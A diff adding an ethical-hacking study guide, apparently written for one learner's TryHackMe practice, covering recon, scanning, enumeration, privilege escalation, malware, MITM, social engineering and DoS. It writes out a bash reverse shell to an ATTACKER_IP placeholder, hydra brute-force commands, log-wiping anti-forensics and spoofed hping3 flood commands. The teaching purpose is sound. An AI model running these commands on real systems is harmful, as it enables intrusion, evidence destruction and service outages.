@@ -1,0 +1,438 @@
+================================================================================
+CYBER MIND SPACE: COMPLETE 11-HOUR ETHICAL HACKING KNOWLEDGE BASE (PART 1)
+TARGET AUDIENCE: GORKHA (ARCH LINUX / THINKPAD / TRYHACKME CLI WORKFLOW)
+OPERATING PHILOSOPHY: HANDS-ON TERMINAL MASTERY, SOCRATIC HINTS, 100% FREE TOOLS
+================================================================================
+
+--------------------------------------------------------------------------------
+0. LAB ARCHITECTURE & ENVIRONMENT SPECS
+--------------------------------------------------------------------------------
+- Host OS: Arch Linux (Rolling release, CLI-first, lightweight).
+- Documentation & Help Tool: tealdeer (tldr) and native man pages.
+- Network Interface: OpenVPN connecting directly to TryHackMe network via tun0.
+- Tool Strategy: Native pacman / AUR packages. Prefer lightweight CLI utilities 
+  (e.g., nmap, tshark, tcpdump, hydra, john, curl, netcat) over resource-heavy GUIs.
+- OpSec Rule: Tor Browser (Standard security mode for functional JS, HTTPS-Only enforced).
+
+--------------------------------------------------------------------------------
+MODULE 01: INTRODUCTION, LAW, AND THE FIVE PHASES OF HACKING
+--------------------------------------------------------------------------------
+1. Core Definitions:
+   - Vulnerability: A weakness, flaw, or misconfiguration in software, hardware, or human processes.
+   - Threat / Threat Actor: An entity or vector capable of exploiting a vulnerability (e.g., insider, hacktivist, APT).
+   - Exploit: Malicious code, script, or sequence designed to take advantage of a vulnerability.
+   - Risk: The probability and impact of a vulnerability being exploited.
+     Formula: Risk = (Threat x Vulnerability x Impact) / Controls.
+
+2. The CIA Triad:
+   - Confidentiality: Protecting data from unauthorized viewing (Encryption, Access Control).
+     Real-World Failure: 2019 Facebook plain-text data breach.
+   - Integrity: Ensuring data is authentic and un-tampered (Hashes, Signatures).
+     Real-World Failure: Stuxnet modifying PLC commands while reporting normal operations.
+   - Availability: Ensuring systems and resources are reachable when needed (Redundancy, Backups).
+     Real-World Failure: GitHub 1.35 Tbps Memcached DDoS attack.
+
+3. The Five Phases of Ethical Hacking:
+   - Phase 1: Reconnaissance (Footprinting) - Passive and active intelligence gathering.
+   - Phase 2: Scanning - Probing networks for live hosts, open ports, and service banners.
+   - Phase 3: Gaining Access (Exploitation) - Leveraging exploits against vulnerabilities to obtain a shell.
+   - Phase 4: Maintaining Access (Persistence) - Establishing backdoors, reverse shells, cron jobs.
+   - Phase 5: Clearing Tracks (Anti-Forensics) - Sanitizing logs, bash history, audit artifacts.
+
+4. Legal and Ethical Frameworks:
+   - CFAA (Computer Fraud and Abuse Act - US), GDPR (EU Data Protection), IT Act 2000 (Section 43, 66).
+   - Rules of Engagement (RoE): Scope documents, permitted attack windows, prohibited techniques.
+   - Non-Disclosure Agreements (NDA): Mandatory before executing legal security assessments.
+
+5. Assigned Practice Rooms (TryHackMe):
+   - "Intro to Cyber Security"
+   - "Pre-Security Learning Path"
+
+--------------------------------------------------------------------------------
+MODULE 02: FOOTPRINTING & RECONNAISSANCE (PASSIVE & ACTIVE)
+--------------------------------------------------------------------------------
+1. Passive Reconnaissance:
+   - Google Dorking:
+     * site:<domain> - Constrains search to a specific domain (e.g., site:gov.in).
+     * filetype:<ext> - Targets specific file extensions (e.g., filetype:pdf, filetype:xls, filetype:env).
+     * intitle:<string> - Scans page titles (e.g., intitle:"index of" "passwords").
+     * inurl:<string> - Matches URLs (e.g., inurl:admin/login.php).
+   - Domain & IP Discovery:
+     * WHOIS: Query registrar and ownership details -> whois target.com
+     * DNS Records: Query A, MX, NS, TXT, and PTR records -> nslookup target.com / dig target.com ANY
+     * Reverse DNS: Resolving IP back to domain name -> dig -x <IP>
+   - OSINT Framework & Social Engineering Recon:
+     * hunter.io: Domain-level email discovery and corporate structure.
+     * namechk / WhatsMyName: Username correlation across social platforms.
+     * exiftool: Extracting GPS coordinates, camera model, and author metadata from images and documents:
+       Syntax: exiftool image.jpg
+
+2. Active Reconnaissance:
+   - theHarvester: Automated CLI tool for harvesting emails, subdomains, and virtual hosts.
+     Syntax: theHarvester -d target.com -b google,yahoo,duckduckgo -l 500
+   - Shodan & Censys (Search Engines for Internet-Connected Devices):
+     * Syntax: port:21 country:IN, webcamXP, "Server: Apache 2.4"
+
+3. Competitive Intelligence:
+   - Tech Stack Profiling: BuiltWith, Wappalyzer.
+   - Job Board Profiling: Discovering internal tech stacks (e.g., AWS, React, Django, Docker) via job postings.
+
+4. Assigned Practice Rooms (TryHackMe):
+   - "Google Dorking"
+   - "OSINT"
+   - "Passive Reconnaissance"
+   - "Intro to Shodan"
+
+--------------------------------------------------------------------------------
+MODULE 03: NETWORK SCANNING & FIREWALL EVASION
+--------------------------------------------------------------------------------
+1. Protocol Foundations:
+   - TCP 3-Way Handshake:
+     * Client sends SYN -> Server responds SYN-ACK -> Client responds ACK.
+     * If Port is Closed: Server responds RST-ACK.
+     * If Port is Filtered: No response or ICMP unreachable.
+   - ICMP: Type 8 (Echo Request), Type 0 (Echo Reply). TTL (Time-To-Live) indicates OS type:
+     * Linux default TTL ~ 64
+     * Windows default TTL ~ 128
+     * Network Appliance default TTL ~ 255
+
+2. Host Discovery:
+   - Ping Sweep (Local & Subnet): nmap -sn 192.168.1.0/24
+   - ARP Scan (Local Layer 2 discovery): arp-scan --interface=eth0 192.168.1.0/24
+
+3. Port Scanning Variations (Nmap):
+   - SYN Stealth Scan (-sS): Sends SYN, receives SYN-ACK, immediately sends RST. Does not complete the connection. Requires root/sudo.
+   - TCP Connect Scan (-sT): Completes full 3-way handshake. Slower, leaves connection logs. Used when non-root.
+   - UDP Scan (-sU): Probes UDP ports (DNS: 53, SNMP: 161, DHCP: 67/68). Extremely slow; waits for ICMP port unreachable.
+   - Inverted Flag Scans (RFC 793 testing against stateless firewalls):
+     * NULL Scan (-sN): No flags set. Open/Filtered = No response; Closed = RST.
+     * FIN Scan (-sF): Only FIN flag set. Open/Filtered = No response; Closed = RST.
+     * XMAS Scan (-sX): FIN, PSH, and URG flags lit up like a Christmas tree.
+
+4. Advanced Nmap Flags & Workflows:
+   - Service Version Detection: -sV
+   - OS Fingerprinting: -O
+   - Aggressive Mode: -A (Enables -O, -sV, -sC script scanning, and traceroute)
+   - Timing Templates: -T0 (Paranoid) to -T5 (Insane). -T4 is standard for lab environments.
+   - Target Ports: -p 22,80,443 | -p- (Scan all 65,535 ports) | --top-ports 1000
+   - Output Formatting: -oN output.txt (Normal text) | -oA full_scan (Saves normal, XML, and grepable).
+   - Firewall Detection (-sA): Sends ACK packet. If RST returns, port is unfiltered (no stateful firewall). If dropped/ICMP returned, port is filtered.
+
+5. Firewall Evasion Techniques:
+   - Packet Fragmentation: nmap -f <target> (Splits TCP headers across multiple packets).
+   - Decoy Scanning: nmap -D RND:10 <target> (Injects 10 random spoofed IP addresses alongside yours).
+   - Source Port Manipulation: nmap --source-port 53 <target> (Spoofs traffic as DNS or NTP to pass inbound ACLs).
+
+6. Banner Grabbing Utilities:
+   - Netcat: nc -nv <IP> 80
+   - Telnet: telnet <IP> 80
+   - Curl: curl -I http://<IP>
+
+7. Assigned Practice Rooms (TryHackMe):
+   - "Nmap Live Host Discovery"
+   - "Nmap Basic Port Scans"
+   - "Nmap Advanced Port Scans"
+   - "Nmap Post Port Scans"
+
+--------------------------------------------------------------------------------
+MODULE 04: ENUMERATION & TARGET VECTORS
+--------------------------------------------------------------------------------
+1. SMB / NetBIOS Enumeration (Ports 139, 445):
+   - Anonymous / Null Session Connection:
+     * smbclient -L //<IP>/ -N (List shares without a password).
+     * smbclient //<IP>/<ShareName> -N (Connect directly to shared folder).
+   - Automated SMB Profiling:
+     * enum4linux -a <IP> (Runs full user, share, workgroup, and password policy dump).
+     * RID Cycling via rpcclient:
+       rpcclient -U "" -N <IP>
+       Commands inside prompt: enumdomusers, queryuser <RID>, lookupnames admin.
+
+2. SNMP Enumeration (Port 161 UDP):
+   - Community Strings: Default read-only credentials (public), default read-write (private).
+   - Snmpwalk:
+     * Syntax: snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1 (Extracts system information).
+     * MIB (Management Information Base) & OID (Object Identifier) hierarchical parsing.
+
+3. DNS Zone Transfers (Port 53 TCP):
+   - AXFR Mechanism: DNS servers replicating complete zone files. If misconfigured, exposes all internal subdomains.
+   - Syntax:
+     * dig axfr @<NameServer_IP> <domain.com>
+     * host -l <domain.com> <NameServer_IP>
+     * dnsenum --enum <domain.com>
+
+4. LDAP Enumeration (Port 389 TCP):
+   - Querying Active Directory trees anonymously:
+     ldapsearch -x -H ldap://<IP> -b "dc=target,dc=local"
+
+5. NFS Enumeration (Port 2049 TCP):
+   - Checking exported mount points:
+     * showmount -e <IP>
+     * Mount local directory: sudo mount -t nfs <IP>:/share /mnt/nfs
+
+6. Assigned Practice Rooms (TryHackMe):
+   - "SMB"
+   - "NFS"
+   - "DNS in Detail"
+   - "Active Directory Basics"
+
+--------------------------------------------------------------------------------
+MODULE 05: VULNERABILITY ANALYSIS & MANAGEMENT
+--------------------------------------------------------------------------------
+1. Vulnerability Assessment vs. Penetration Testing:
+   - Vulnerability Assessment: Breadth-first. Automated scanning to identify, classify, and prioritize bugs without active exploitation.
+   - Penetration Testing: Depth-first. Actively exploits verified flaws to simulate real-world breach impact.
+
+2. Standards and Repositories:
+   - CVE (Common Vulnerabilities and Exposures): Unique identifier format CVE-YYYY-NNNN.
+   - NVD (National Vulnerability Database): Maintained by NIST, enriches CVEs with impact scores and patches.
+   - Exploit-DB: Archive of public exploits and Proof of Concepts (PoC).
+     * CLI Search Tool: searchsploit <service> <version> (e.g., searchsploit vsftpd 2.3.4).
+
+3. CVSS v3 Scoring Metrics (0.0 to 10.0 scale):
+   - Low: 0.1 - 3.9
+   - Medium: 4.0 - 6.9
+   - High: 7.0 - 8.9
+   - Critical: 9.0 - 10.0
+   - Metric Groups:
+     * Base Metrics: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), Impact on C-I-A.
+     * Temporal Metrics: Exploit Code Maturity (E), Remediation Level (RL), Report Confidence (RC).
+     * Environmental Metrics: Custom system-specific mitigation adjustments.
+
+4. Scanning Tools & Reporting:
+   - Nmap Scripting Engine (NSE) Vuln Category:
+     nmap --script vuln -p- <IP>
+   - Nikto Web Scanner:
+     nikto -h http://<IP>
+   - Vulnerability Report Structure:
+     * Executive Summary (Business impact for non-technical leadership).
+     * Scope & Methodology.
+     * Detailed Technical Findings (CVSS score, description, affected asset, PoC).
+     * Risk Prioritization & Remediation Roadmap.
+
+5. Assigned Practice Rooms (TryHackMe):
+   - "Vulnerability Research"
+   - "Exploit Basics"
+
+--------------------------------------------------------------------------------
+MODULE 06: SYSTEM HACKING, EXPLOITATION & PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+1. Password Cracking Fundamentals:
+   - Techniques: Brute Force (all permutations), Dictionary Attack (wordlist matching), Rainbow Tables (precomputed hash lookups).
+   - Salts: Random cryptographic data appended to plain text before hashing to render rainbow tables useless.
+   - CLI Tooling:
+     * Hydra (Online Network Authentication Cracker):
+       hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+       hydra -L users.txt -P passwords.txt <IP> ftp
+     * John the Ripper (Offline Hash Cracking):
+       john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+       john --format=sha512crypt hashes.txt
+       john --show hashes.txt
+
+2. Reverse Shells vs. Bind Shells:
+   - Bind Shell: Target listens on a local port; attacker connects into the target. Fails if target has an inbound firewall.
+   - Reverse Shell: Attacker sets up a listener; target initiates outbound connection back to the attacker. Bypasses inbound firewalls.
+   - Netcat Listener Setup:
+     nc -lvnp 4444
+   - Standard Bash Reverse Shell:
+     bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+
+3. Metasploit Framework (msfconsole) Execution:
+   - Workflow:
+     1. Search for module: search <exploit_name>
+     2. Select module: use <path_to_module>
+     3. Check variables: show options
+     4. Set target: set RHOSTS <TARGET_IP>
+     5. Set listener: set LHOST <TUN0_IP>
+     6. Execute: exploit or run
+
+4. Linux Privilege Escalation Vectors:
+   - Weak File Permissions:
+     * Check permissions: ls -l /etc/shadow /etc/passwd
+     * If /etc/shadow is readable: Crack root hash via John the Ripper.
+     * If /etc/passwd is writable: Generate encrypted password hash (`openssl passwd -1 password123`), 
+       replace root's 'x' in /etc/passwd with the generated hash, and switch user (`su root`).
+   - SUID Binaries (Set User ID upon execution):
+     * Discovery command: find / -perm -u=s -type f 2>/dev/null
+     * Cross-reference against GTFOBins for bypasses.
+   - Sudo Privileges:
+     * Verification: sudo -l
+     * Look for scripts or binaries runnable without a password (`NOPASSWD`).
+
+5. Windows Privilege Escalation Vectors:
+   - Unquoted Service Paths:
+     * Condition: Service binary path contains spaces and is not enclosed in quotation marks 
+       (e.g., C:\Program Files\Common Files\Service Path\service.exe).
+     * Windows execution priority looks for executables at each space:
+       1. C:\Program.exe
+       2. C:\Program Files\Common.exe
+       3. C:\Program Files\Common Files\Service.exe
+     * Attacker drops malicious payload (common.exe) into writable intermediate directory and restarts service.
+   - Tools: accesschk.exe to inspect ACL permissions on services.
+
+6. Anti-Forensics & Clearing Tracks:
+   - Linux:
+     * Clear shell history: history -c; rm ~/.bash_history
+     * Disable logging for session: unset HISTFILE
+     * Secure file destruction: shred -u -z -n 5 malicious_file
+     * Emptying log files without deleting them: truncate -s 0 /var/log/auth.log
+   - Windows:
+     * Event Viewer log purging via CLI: wevtutil cl System | wevtutil cl Security | wevtutil cl Application
+
+7. Assigned Practice Rooms (TryHackMe):
+   - "Hydra"
+   - "John the Ripper"
+   - "Linux PrivEsc"
+   - "Windows PrivEsc"
+
+--------------------------------------------------------------------------------
+MODULE 07: MALWARE THREATS & IN-MEMORY EVASION
+--------------------------------------------------------------------------------
+1. Malware Classifications:
+   - Virus: Requires human execution and a host program to spread.
+   - Worm: Self-replicating and self-propagating across network protocols without user intervention.
+     Historic Examples: Morris Worm (1988), ILOVEYOU (2000), Conficker (2008).
+   - Trojan Horse: Disguised as legitimate utility (cracked software, keygen) that executes hidden malicious code.
+   - RAT (Remote Access Trojan): Client-server architecture providing full interactive command/control (C2).
+   - Ransomware: Cryptographically locks local disks and demands cryptocurrency ransom.
+     Historic Example: WannaCry (2017) leveraging the EternalBlue (MS17-010) SMB vulnerability.
+   - Rootkit: Operates at kernel level to conceal processes, files, and network sockets from the OS.
+   - Spyware / Infostealer: Covertly logs keystrokes, webcam feeds, credentials (e.g., Pegasus).
+
+2. Advanced Persistent Threats (APTs):
+   - Definition: Nation-state or heavily funded organizations executing prolonged, low-and-slow campaigns.
+   - Prominent Groups: APT28 (Fancy Bear - Russia), APT29 (Cozy Bear - Russia), Lazarus Group (North Korea).
+   - Milestone Case: Stuxnet (2010) targeting Siemens PLCs in Iranian uranium centrifuges across an air-gapped network.
+
+3. Fileless Malware & Living-off-the-Land (LotL):
+   - In-Memory Execution: Malicious scripts execute directly in volatile RAM via native tools (PowerShell, WMI, mshta).
+   - Never writes an executable binary to disk, bypassing traditional signature-based file scanners.
+   - Detection: Behavior-based Endpoint Detection & Response (EDR) such as CrowdStrike, Microsoft Defender for Endpoint, Sysmon.
+
+4. Malware Analysis Methodologies:
+   - Static Analysis: Dissecting the binary without running it.
+     * Tools: strings, md5sum, sha256sum, Ghidra, PEStudio.
+     * Extraction: Hardcoded IPs, URLs, base64 strings, imported Windows APIs.
+   - Dynamic Analysis: Executing malware within an isolated sandbox while recording actions.
+     * Tools: Any.Run, Cuckoo Sandbox, Wireshark, Process Monitor (Procmon), Regshot.
+     * Behavior monitoring: Registry modifications, dropped temp files, outbound C2 beaconing.
+
+5. Assigned Practice Rooms (TryHackMe):
+   - "Intro to Malware Analysis"
+   - "Malware Introductory"
+
+--------------------------------------------------------------------------------
+MODULE 08: PACKET SNIFFING & MAN-IN-THE-MIDDLE (MITM)
+--------------------------------------------------------------------------------
+1. Sniffing Mechanics:
+   - Promiscuous Mode: Configuring the network interface controller (NIC) to pass all captured traffic to the CPU, 
+     not just packets addressed to its own MAC.
+   - Switch Behavior & CAM Table Overflow (MAC Flooding):
+     * Switches route packets based on MAC address tables.
+     * If an attacker floods the CAM table with fake MAC addresses (e.g., macof), the switch degrades into 
+       a Hub, broadcasting all incoming frames to every physical port.
+
+2. ARP Poisoning / Spoofing:
+   - ARP (Address Resolution Protocol): Resolves Layer 3 IP addresses to Layer 2 MAC addresses. Stateless and unauthenticated.
+   - Attack Workflow:
+     1. Attacker enables IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1
+     2. Attacker sends unsolicited gratuitous ARP replies to Target: "I am the Gateway IP."
+     3. Attacker sends gratuitous ARP replies to Gateway: "I am the Target IP."
+     4. All target traffic routes through Attacker's machine before reaching the true Gateway.
+   - CLI Tools: arpspoof, ettercap -G, bettercap.
+
+3. SSL Stripping:
+   - Mechanism: Downgrades HTTPS traffic to unencrypted HTTP between the victim and attacker while maintaining 
+     HTTPS between attacker and destination server.
+   - Defense: HSTS (HTTP Strict Transport Security) headers forced by modern browsers.
+
+4. Packet Inspection CLI Tools:
+   - Wireshark: Graphical packet analyzer.
+   - Tcpdump: Lightweight terminal packet analyzer.
+     * Capture to file: sudo tcpdump -i tun0 -w capture.pcap
+     * Read from file: tcpdump -r capture.pcap 'port 80 or port 443'
+     * Filter HTTP POST traffic: sudo tcpdump -i any -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:2]&0xf0)>>2)) != 0)'
+
+5. Assigned Practice Rooms (TryHackMe):
+   - "Wireshark 101"
+   - "Wireshark: Packet Operations"
+
+--------------------------------------------------------------------------------
+MODULE 09: SOCIAL ENGINEERING ATTACKS & VECTOR MECHANICS
+--------------------------------------------------------------------------------
+1. Attack Lifecycle:
+   - Phase 1: Information Gathering (OSINT, social profiling).
+   - Phase 2: Target Selection (Identifying high-yield, low-awareness employees).
+   - Phase 3: Relationship Building (Establishing trust via rapport and empathy).
+   - Phase 4: Attack Execution (Delivering weaponized payload, credential harvest link).
+   - Phase 5: Information Extraction / Payload Execution.
+   - Phase 6: Exit & Clean Up (Removing artifacts, establishing persistence).
+
+2. Attack Vectors:
+   - Phishing: Mass deceptive email delivery.
+   - Spear Phishing: Highly customized, researched email targeting a specific individual.
+   - Whaling: Targeting C-suite executives (CEO, CFO) for Business Email Compromise (BEC) wire transfers.
+   - Vishing (Voice Phishing): Telephone-based spoofing, AI voice cloning.
+   - Smishing: SMS-based credential harvesting.
+   - Pretexting: Fabricating an elaborate persona/scenario (e.g., IT support tech needing credentials to fix a ticket).
+   - Tailgating / Piggybacking: Physical security breach by following an authorized person through a locked door.
+   - Baiting: Leaving malware-infected USB flash drives in parking lots or lobbies labeled "Confidential Payroll".
+
+3. Core Psychological Principles (Cialdini's Triggers):
+   - Authority: Impersonating executives, police, regulators.
+   - Urgency: Imposing artificial deadlines ("Account suspended in 15 minutes").
+   - Fear: Threatening punitive action or public exposure.
+   - Scarcity: "Only 2 spots remaining for bonus payout."
+   - Reciprocity: Providing a small unsolicited favor before asking for access.
+
+4. Frameworks & Tooling:
+   - SET (Social-Engineer Toolkit): Command-line utility for generating credential harvesters, cloning login pages, 
+     and crafting mass spear-phishing templates.
+     Launch on Arch: sudo setoolkit
+
+5. Assigned Practice Rooms (TryHackMe):
+   - "Phishing Emails"
+   - "Social Engineering"
+
+--------------------------------------------------------------------------------
+MODULE 10: DENIAL OF SERVICE (DOS) & DISTRIBUTED DOS (DDOS)
+--------------------------------------------------------------------------------
+1. Fundamentals:
+   - Denial of Service (DoS): Exhausting target system resources from a single attacking source until legitimate requests fail.
+   - Distributed Denial of Service (DDoS): Utilizing a coordinated botnet across thousands of geographically dispersed 
+     compromised systems to overwhelm the target.
+
+2. Attack Categories:
+   - Volumetric Attacks:
+     * Overwhelms network bandwidth capacity measured in Gigabits/Terabits per second (Gbps/Tbps).
+     * Vectors: UDP Floods, ICMP Floods, DNS Amplification (exploiting open resolvers to magnify packet size 50x-70x).
+   - Protocol Attacks:
+     * Consumes intermediate infrastructure state tables (firewalls, load balancers) measured in Packets per Second (PPS).
+     * Vectors: TCP SYN Floods (filling the backlog queue with uncompleted handshakes), Ping of Death (malformed oversized ICMP packets).
+   - Application Layer Attacks (Layer 7):
+     * Targets specific web application endpoints (e.g., search queries, login forms, PDF generation) measured in Requests per Second (RPS).
+     * Vectors:
+       - HTTP Flood: Overloading web server CPUs by repeatedly querying dynamic database endpoints.
+       - Slowloris: Opening hundreds of HTTP connections and sending partial headers at agonizingly slow intervals 
+         to hold server worker threads open until the pool is exhausted.
+
+3. Low-Level CLI Execution Tool:
+   - Hping3 (Raw Packet Crafting):
+     * ICMP Flood: sudo hping3 -1 --flood <TARGET_IP>
+     * SYN Flood: sudo hping3 -S -p 80 --flood <TARGET_IP>
+     * Spoofed Source SYN Flood: sudo hping3 -S -p 80 --flood --rand-source <TARGET_IP>
+
+4. Defensive Analysis & SIEM Pattern Recognition:
+   - Log Signatures of a Layer 7 Attack:
+     * Spikes in HTTP status code 503 (Service Unavailable) or 504 (Gateway Timeout).
+     * Abnormal User-Agent strings (e.g., python-requests, curl, blank).
+     * Massive geographic variance for regional websites.
+     * Uniform request frequencies to computationally heavy backend endpoints (/search.php, /login.php).
+   - Splunk SIEM Query Syntax:
+     index=main sourcetype=access_combined status=503 | timechart count by uri_path
+   - Mitigation Controls: Anycast network routing, Cloudflare/AWS Shield CDNs, Web Application Firewalls (WAF), 
+     Rate limiting, CAPTCHAs, SYN cookies.
+
+5. Assigned Practice Rooms (TryHackMe):
+   - "Network Security Protocols"
+   - "Denial of Service"
+================================================================================
